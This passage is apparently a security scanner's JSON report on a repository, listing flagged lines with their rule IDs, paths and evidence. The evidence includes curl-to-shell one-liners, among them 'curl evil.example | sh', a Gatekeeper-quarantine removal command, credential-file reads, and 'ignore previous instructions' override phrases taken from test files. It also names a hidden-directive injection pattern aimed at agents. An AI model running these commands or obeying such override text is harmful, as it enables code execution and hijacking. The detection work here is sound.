+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/runs/haiku/q18/control/attempt-1/answer.md",
+      "line": 14,
+      "evidence": "curl -LsSf https://astral.sh/uv/install.sh | sh",
+      "file_sha256": "157fa76a30419e2c0e2c31d5f7e62ba85400917065ae8ebe38638ece953cd721"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/runs/haiku/q18/control/attempt-1/stream.jsonl",
+      "line": 14,
+      "evidence": "curl -LsSf https://astral.sh/uv/install.sh | sh",
+      "file_sha256": "d4d9cddd8cf174dbd2054e0abe0f0056298f75d694c0fec27a785fbd7238530e"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/runs/haiku/q20/experimental/attempt-1/answer.md",
+      "line": 9,
+      "evidence": "curl -fsSL https://ollama.com/install.sh | sh",
+      "file_sha256": "631e6dd45dd24958813354e2a4f48c00cd65f23b78b5ae5511c3e774303d3b53"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/runs/haiku/q20/experimental/attempt-1/stream.jsonl",
+      "line": 7,
+      "evidence": "curl -fsSL https://ollama.com/install.sh | sh",
+      "file_sha256": "1bd9c849f56b1f48cc914a8be3218cc62d5b26404f49ee6ffc90de32837dbd93"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/runs/haiku/q20/control/attempt-1/answer.md",
+      "line": 9,
+      "evidence": "curl -fsSL https://ollama.com/install.sh | sh",
+      "file_sha256": "4af30629f306a813595d69134c162e1d3d28a98fbb861b20e2ceed76eea5d57f"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/runs/haiku/q20/control/attempt-1/stream.jsonl",
+      "line": 7,
+      "evidence": "curl -fsSL https://ollama.com/install.sh | sh",
+      "file_sha256": "1cfc0b7cbbf89d51415254f54682cce5a45f47327c5aa5893a62c320212e4c0b"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/runs/haiku/q17/experimental/attempt-1/answer.md",
+      "line": 9,
+      "evidence": "curl -fsSL https://ollama.com/install.sh | sh",
+      "file_sha256": "0a814402729575edfa2152ded0669666fb0849d01d6dded562d0aaad44587518"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/runs/haiku/q17/experimental/attempt-1/stream.jsonl",
+      "line": 18,
+      "evidence": "curl -fsSL https://ollama.com/install.sh | sh",
+      "file_sha256": "36333f2602b194fc80d370ba2d4a2d53af58f9c6b04e4832eedf4cbc55ea6743"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/runs/haiku/q17/control/attempt-1/answer.md",
+      "line": 14,
+      "evidence": "curl -fsSL https://ollama.com/install.sh | sh",
+      "file_sha256": "fc94e42aeca3935ec9c9211040a643ea5a28483e37d013b6902daa94174861b3"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/runs/haiku/q17/control/attempt-1/stream.jsonl",
+      "line": 17,
+      "evidence": "curl -fsSL https://ollama.com/install.sh | sh",
+      "file_sha256": "c7c44121e4b7996929efd0e1e05b5a0b71f7a96432bb5f358b9405e3c387c196"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/runs/haiku/q09/experimental/attempt-1/stream.jsonl",
+      "line": 15,
+      "evidence": "curl script from the project's GitHub repo, which one listing shows as curl -fsS",
+      "file_sha256": "211df14d9afa514ae514f1604f6e03db4ad815aa35f206e71adc6ea05dbc0d3c"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-R-0105",
+      "summary": "Strips macOS Gatekeeper quarantine from a downloaded file (ClawHavoc-style stealer delivery)",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/b-set/pool.json",
+      "line": 21355,
+      "evidence": "xattr -d com.apple.quarantine",
+      "file_sha256": "8dfb97091d672c3a4b6baf8307544ecaf8c14c6cd66877ac381f1359c92c942f"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-T-0002",
+      "summary": "Reads SSH keys, cloud credentials, keychains or browser profiles",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/scripts/box_reconcile.py",
+      "line": 318,
+      "evidence": "args.aws_cost.read_text(encoding=\"utf-8\")",
+      "file_sha256": "90ce324b9b26f871f94a4d6b4cbe64dfb39373c45ea105fd975d9b8969200669"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-T-0002",
+      "summary": "Reads SSH keys, cloud credentials, keychains or browser profiles",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/scripts/box_reconcile.py",
+      "line": 322,
+      "evidence": "args.aws_account.read_text(encoding=\"utf-8\")",
+      "file_sha256": "90ce324b9b26f871f94a4d6b4cbe64dfb39373c45ea105fd975d9b8969200669"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/worker/test/well-known.test.ts",
+      "line": 153,
+      "evidence": "curl -fsSL get.tool.sh | sh",
+      "file_sha256": "e0a2cbfcb03c9202b9a1322fd3bd7c845f2249f5b5d0019227d59ce7005e3e9d"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/worker/test/outcome.test.ts",
+      "line": 262,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "05575b1ce120d1a704425445759d4b2d65bd0db1aff3117e7522ec3b51ce3b1a"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/worker/test/fixtures/software/fixture-llm-runner.json",
+      "line": 97,
+      "evidence": "curl -fsSL https://example.invalid/fixture/fixture-llm-runner/install.sh | sh",
+      "file_sha256": "8e7391fa742fe7d7e47ae4a9b30386c77f613c682ebd631096a2b32f1ec58c7e"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/docs/research/notes/sandbox-verify-design.md",
+      "line": 70,
+      "evidence": "curl … \\| sh",
+      "file_sha256": "4e3b2d7e6db827351d8b95ea8596da29efe376016b3f0534dfe69dc6ea885f5f"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/docs/research/notes/mcp-server.md",
+      "line": 558,
+      "evidence": "curl … | sh",
+      "file_sha256": "45dcd57126f41b48eac8144fe5219b178afe260255f2101ecf240077c3f0c3a0"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/docs/research/notes/quality-scoring.md",
+      "line": 40,
+      "evidence": "curl … \\| sh",
+      "file_sha256": "af3f04734964313ff63bed0df231da3dc85c1ef2b3c698fd7e7a26ed86b32a34"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/spikes/sandbox_docker_install.py",
+      "line": 94,
+      "evidence": "curl|bash",
+      "file_sha256": "f8dfa580c147b6d1a3d05ce0afd72bfee1107fe3e830f1ba7d31809d4dd59ebb"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/video/scenes/thread.html",
+      "line": 310,
+      "evidence": "curl … /linux | bash",
+      "file_sha256": "491c10368434996fb7bd04a1f2754efea0484f698be4bcaa126fd9550ed6dc34"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/tests/queue_fakes.py",
+      "line": 53,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "6ea68de8d44f868593eb8bb6c91549a6eeafa6419a250f8fef3c150c9e07e16c"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/tests/test_verify_agent.py",
+      "line": 546,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "bf3edb03224aeab4ef1ce0ebf827c2f13e9faf00738af6ad324677142c1e033e"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/tests/test_prescreen.py",
+      "line": 33,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "a6525aead72fa693c9e98486f50cc6436f371aac987b46f99435d9a170d7ac4b"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/tests/test_score.py",
+      "line": 146,
+      "evidence": "curl -fsSL https://x.dev/install | sh",
+      "file_sha256": "bbe708e08fc2b5202ea5a7596cfaf9b53907dcb89993556dc1d6bae6201a8cc4"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/tests/test_profiles.py",
+      "line": 166,
+      "evidence": "curl -fsSL https://x.dev/install.sh | bash",
+      "file_sha256": "d3cc0352b591b23d04322be371923a2883fd2d65c0b3dcaca18d352cc9353c7d"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/tests/test_web_intake.py",
+      "line": 30,
+      "evidence": "IGNORE PREVIOUS INSTRUCTIONS",
+      "file_sha256": "fbcf8e05761fa8c8411ae6b97f4e217a331c92e4b6739a713b0e5dac1e2a9190"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/tests/test_verify_judge.py",
+      "line": 90,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "5d56e2c969ba0bbac94e7e88e120a6f991d1eacb41217775bc2b6c871fd9c087"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/tests/test_verify_pipeline.py",
+      "line": 390,
+      "evidence": "curl -fsSL .../install.sh | sh",
+      "file_sha256": "212f0b302a9dc4e64a57a4cf910125e0b3d8b376b1f55e2f6cb9cfd107d212d5"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/tests/test_watch.py",
+      "line": 843,
+      "evidence": "curl -fsSL https://t.dev/i.sh | sh",
+      "file_sha256": "e900469c51894411c8cf3597309969bdc13d7608694bb91374848a727d10fa4b"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/tests/test_watch.py",
+      "line": 31,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "e900469c51894411c8cf3597309969bdc13d7608694bb91374848a727d10fa4b"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/tests/test_extract.py",
+      "line": 216,
+      "evidence": "curl -fsSL https://x.sh/i.sh \\| bash",
+      "file_sha256": "959fe97283c98f5fdae5cc876045504119f3b01e8b4d4c391df7715272d19e6a"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/tests/test_extract.py",
+      "line": 46,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "959fe97283c98f5fdae5cc876045504119f3b01e8b4d4c391df7715272d19e6a"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/tests/test_verify_sysdeps.py",
+      "line": 204,
+      "evidence": "curl evil.example | sh",
+      "file_sha256": "2c62c4c820ee5ac5cf4835d8a040ff72b31b299283143c3aa021ff4480555f25"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/tests/test_schema.py",
+      "line": 920,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "9f6114b7d52e7678e41f555ee959c327214e4da396148e923470f1e348b8ef80"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/tests/fixtures/verify/evnx.json",
+      "line": 73,
+      "evidence": "curl -sSL https://raw.githubusercontent.com/urwithajit9/evnx/main/scripts/instal",
+      "file_sha256": "5e0cea45ff34463b9550c473ed7ec774777f34119d5f79f7ba329b54f5ba650e"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/tests/test_reverify.py",
+      "line": 333,
+      "evidence": "curl -fsSL https://evil.example/frobtail.sh | sh",
+      "file_sha256": "9ce89373a0dda5870042d345f1a2fa03776e01b5c0f51aa1f3b6f9cd7e8c4e3f"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/tests/test_verify_verdict.py",
+      "line": 104,
+      "evidence": "curl -fsSL https://bun.sh/install | bash",
+      "file_sha256": "bc4fd3e64d945db8a2e7efe27cb67785241de7457ae7743c1fcff2f53a5a3ff9"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/tests/test_index.py",
+      "line": 248,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "a690e69920c62589c642f4977e8d7412559ba033a7d9c09bdc3def8493459d0f"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/tests/test_verify_grants.py",
+      "line": 151,
+      "evidence": "curl | sh",
+      "file_sha256": "7e595b4a5aa8f00bf213ce9087a111d3d7f8e355190dba2475e0334622dd7edb"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/tests/test_mcp_probe.py",
+      "line": 172,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "3ef3a1e364b45eb58a638fecc8dbe94b241b50e8799292d68cd190b7465aab31"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0005",
+      "summary": "Hidden directive block (<IMPORTANT>/<SYSTEM>) that points the agent at credentials or config files",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/tests/test_mcp_probe.py",
+      "line": 66,
+      "evidence": "<IMPORTANT>",
+      "file_sha256": "3ef3a1e364b45eb58a638fecc8dbe94b241b50e8799292d68cd190b7465aab31"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/tests/test_checkin_script.py",
+      "line": 37,
+      "evidence": "curl https://example.invalid | sh",
+      "file_sha256": "9edbb7715878cf4a3a90af8ddb054812cf48c5da04bd8c63a5520978d4279a9c"
+    }
+  ],
+  "flags": [
+    {
+      "severity": "low",
+      "id": "AGT-F-NEW-DOMAINS",
+      "summary": "Contacts domains the previous version did not",
+      "path": null,
+      "line": null,
+      "evidence": "012.0.0.1, 4dchess.org, antv-studio.alipay.com, arcadegame-vault.vercel.app, aurelio-nakamura.github.io, babel.dev, burgerperson.com, catchy.games, cdn.autonomous.ai, chat.intellinode.ai, chenlongapps.github.io, ckluis.github.io, deb.example.invalid, dl.filippo.io, dumpsort.vercel.app, encryptalotta.com, epub.ftak.net, fan.themahjongsocialcompany.com, freeparking.nyc, gmgn.ai, jaeseok614.github.io, karmit.co, mcp.worldrole.work, mermaid.live, mise.run, nextjs.org, optipress.cdrusu.com, prod.codes, push.cmyr.dev, reactrouter.com, regex101.com, remedi.ar, schemas.openxmlformats.org, sharplineup.com, sleepylgod.github.io, stem.irky.dev, steve1316.github.io, tangledtaste.com, theelectiondashboard.com, time.eigentime.org, trusted.example, vitest.dev, whiteboard.landmann.ph, www.backstory.today, www.getemerald.co, xipher.org, zellij.dev",
+      "file_sha256": null
+    }
+  ],
+  "domains": [
+    "012.0.0.1",
+    "1.1.1.1",
+    "10.0.0.1",
+    "10.255.255.1",
+    "127.0.0.1",
+    "169.254.169.254",
+    "4dchess.org",
+    "antv-studio.alipay.com",
+    "api.anthropic.com",
+    "api.deps.dev",
+    "api.first.org",
+    "api.github.com",
+    "api.meta.ai",
+    "api.npmjs.org",
+    "api.osv.dev",
+    "api.x.com",
+    "arcadegame-vault.vercel.app",
+    "aurelio-nakamura.github.io",
+    "babel.dev",
+    "bsky.app",
+    "bsky.social",
+    "burgerperson.com",
+    "catchy.games",
+    "cdn.autonomous.ai",
+    "cdn.winget.microsoft.com",
+    "chat.intellinode.ai",
+    "checkip.amazonaws.com",
+    "chenlongapps.github.io",
+    "ckluis.github.io",
+    "codeload.github.com",
+    "crates.io",
+    "deb.example.invalid",
+    "dillinger.io",
+    "dl-cdn.alpinelinux.org",
+    "dl.filippo.io",
+    "dl.flathub.org",
+    "dumpsort.vercel.app",
+    "encryptalotta.com",
+    "epub.ftak.net",
+    "example.com",
+    "fan.themahjongsocialcompany.com",
+    "flathub.org",
+    "formulae.brew.sh",
+    "freeparking.nyc",
+    "ghcr.io",
+    "github.com",
+    "gmgn.ai",
+    "go.dev",
+    "hacker-news.firebaseio.com",
+    "hn.algolia.com",
+    "huggingface.co",
+    "index.crates.io",
+    "inference.baseten.co",
+    "jaeseok614.github.io",
+    "json-schema.org",
+    "karmit.co",
+    "lixbon.com",
+    "mcp.worldrole.work",
+    "mermaid.live",
+    "mise.run",
+    "ncchen99--ep-pickfit-spark-open-server.us-west.modal.direct",
+    "news.ycombinator.com",
+    "nextjs.org",
+    "ollama.com",
+    "openrouter.ai",
+    "optipress.cdrusu.com",
+    "pickfit-mcp.ncchen99.workers.dev",
+    "pickfit.app",
+    "prod.codes",
+    "push.cmyr.dev",
+    "pypi.org",
+    "pypistats.org",
+    "raw.githubusercontent.com",
+    "reactrouter.com",
+    "regex101.com",
+    "regexr.com",
+    "registry.modelcontextprotocol.io",
+    "registry.npmjs.org",
+    "remedi.ar",
+    "schemas.microsoft.com",
+    "schemas.openxmlformats.org",
+    "sharplineup.com",
+    "sleepylgod.github.io",
+    "static.rust-lang.org",
+    "stem.irky.dev",
+    "steve1316.github.io",
+    "tangledtaste.com",
+    "theelectiondashboard.com",
+    "time.eigentime.org",
+    "trusted.example",
+    "vitest.dev",
+    "whiteboard.landmann.ph",
+    "www.backstory.today",
+    "www.cisa.gov",
+    "www.freedesktop.org",
+    "www.getemerald.co",
+    "www.w3.org",
+    "x.com",
+    "xipher.org",
+    "zellij.dev"
+  ],
+  "install_script": false,
+  "score": "high"
+}
